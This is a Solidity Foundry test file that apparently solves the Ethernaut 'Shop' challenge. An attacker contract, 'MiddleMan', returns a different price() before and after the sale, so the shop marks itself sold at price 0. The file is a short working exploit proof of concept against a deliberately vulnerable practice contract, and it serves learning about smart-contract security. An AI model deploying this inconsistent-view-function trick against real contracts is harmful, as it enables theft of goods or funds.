// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Shop.sol";

// return price() differently
contract MiddleMan is Buyer {
    bool public counter;
    Shop prey;

    constructor(address preyAddr) {
        prey = Shop(preyAddr);
    }

    function price() external view returns (uint256) {
        if (prey.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function attack() public {
        prey.buy();
    }
}

contract ShopTest is Test {
    Shop instance;

    function setUp() public {
        instance = new Shop();
    }

    function test() public {
        assertEq(instance.isSold(), false);
        assertEq(instance.price(), 100);

        MiddleMan middleMan = new MiddleMan(address(instance));
        middleMan.attack();

        assertEq(instance.isSold(), true);
        assertEq(instance.price(), 0);
    }
}
